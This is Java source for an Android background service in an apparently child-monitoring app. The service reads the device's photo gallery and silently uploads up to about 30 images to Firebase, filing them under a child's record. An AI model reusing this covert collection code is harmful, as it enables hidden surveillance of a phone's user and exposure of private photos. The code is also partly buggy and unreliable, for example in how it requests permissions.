package com.example.childproject;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.GridView;
import android.widget.ImageView;
import android.widget.Toast;

import com.bumptech.glide.Glide;
import com.example.childproject.Common.Common;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import es.dmoral.toasty.Toasty;


public class ImgesService extends Service {
    private ArrayList<String> images;
    FirebaseAuth auth;
    StorageReference storageReference;
    FirebaseStorage storage;
    private static final int PICK_FROM_GALLERY = 1;
    int size;
    int temp;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            auth = FirebaseAuth.getInstance();
            storage = FirebaseStorage.getInstance();
            storageReference = storage.getReference();
            loadallImages();
        } catch (InterruptedException e) {
            Toasty.error( getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG ).show();
        }
        return  START_STICKY;
    }

    private void loadallImages() throws InterruptedException {

        new ImageAdapter( ImgesService.this );

        try {
            if (ActivityCompat.checkSelfPermission( ImgesService.this, android.Manifest.permission.READ_EXTERNAL_STORAGE ) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions( (Activity) getApplicationContext(),new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, PICK_FROM_GALLERY );
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (images != null) {
            FirebaseUser user = auth.getCurrentUser();
            String UserId = user.getUid();

            if (images.size() > 100) {
                size = 30;
            } else {
                size = images.size();
            }


            for (int i = 0; i < size - 1; i++) {
                Uri uri = Uri.fromFile( new File( images.get( i ) ) );
                String imageName = UUID.randomUUID().toString();

                final StorageReference imageFolder = storageReference.child( "images/" + imageName );
                temp = 0;
                imageFolder.putFile( uri )
                        .addOnSuccessListener( new OnSuccessListener<UploadTask.TaskSnapshot>() {
                            @Override
                            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                imageFolder.getDownloadUrl().addOnSuccessListener( new OnSuccessListener <Uri>() {
                                    @Override
                                    public void onSuccess(Uri uri) {
                                        Map<String, Object> update = new HashMap<>();
                                        update.put( "image", uri.toString() );
                                        DatabaseReference gallery = FirebaseDatabase.getInstance().getReference( Common.Child_information_tb1 );
                                        gallery.child( FirebaseAuth.getInstance().getCurrentUser().getUid() )
                                                .child( Common.Gallery )
                                                .push()
                                                .updateChildren( update ).addOnCompleteListener( new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                             //   Toasty.success( ImgesService.this, "Image Was Uploaded" + temp, Toast.LENGTH_LONG, true ).show();
                                                temp++;

                                            }
                                        } )
                                                .addOnFailureListener( new OnFailureListener() {
                                                    @Override
                                                    public void onFailure(@NonNull Exception e) {
                                                        Toasty.error( ImgesService.this, "Failed " + e.getMessage(), Toast.LENGTH_LONG, true ).show();
                                                    }
                                                } );

                                    }
                                } );


                            }
                        } );

                // TimeUnit.SECONDS.sleep( 5 );
                System.gc();

            }
        }


    }
    private class ImageAdapter extends BaseAdapter {

        /** The context. */
        private ImgesService context;

        /**
         * Instantiates a new image adapter.
         *
         * @param localContext
         *            the local context
         */
        public ImageAdapter(ImgesService localContext) {
            context = localContext;
            images = getAllShownImagesPath(context);
        }

        @Override
        public  int getCount() {
            return images.size();
        }

        @Override
        public Object getItem(int position) {
            return position;
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        @Override
        public View getView(int position, View convertView,
                            ViewGroup parent) {
            ImageView picturesView;
            if (convertView == null) {
                picturesView = new ImageView(context);
                picturesView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                picturesView
                        .setLayoutParams(new GridView.LayoutParams(270, 270));

            } else {
                picturesView = (ImageView) convertView;
            }

            Glide.with(context).load(images.get(position))
                    // .placeholder(R.drawable.ic_launcher).centerCrop()
                    .into(picturesView);

            return picturesView;
        }
    }
    private ArrayList<String> getAllShownImagesPath(ImgesService activity) {
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<String>();
        String absolutePathOfImage = null;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME };

        cursor = activity.getContentResolver().query(uri, projection, null,
                null, null);

        column_index_data = cursor.getColumnIndexOrThrow( MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);

            listOfAllImages.add(absolutePathOfImage);
        }
        return listOfAllImages;
    }
}
